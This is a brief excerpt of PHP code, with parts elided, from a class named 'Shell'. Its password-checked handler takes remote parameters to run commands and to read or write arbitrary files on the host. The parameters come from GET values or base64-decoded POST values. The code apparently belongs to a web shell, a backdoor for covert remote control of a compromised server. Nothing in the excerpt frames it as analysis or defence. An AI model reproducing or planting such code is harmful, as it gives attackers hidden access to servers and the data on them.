...
class Shell 
{
	...
	{
		function request($req) { return isset($_GET[$req]) ? urldecode($_GET[$req]) : base64_decode($_POST[$req]); }
		if(!isset($_REQUEST["remote"]) || @md5($_REQUEST["password"]) != PASSWORD) return;
		if(isset($_REQUEST["cmd"])) {
			...
			$fe = new FileEditor(request("read"));
			$fe->feRead();
			echo ($fe->message != "") ? $fe->message : $fe->text;
		} elseif(isset($_REQUEST["write"])) {
			$fe = new FileEditor(request("write"));
			$fe->feWrite(request("data")); 
			echo $fe->message;
		}
		exit();
	}
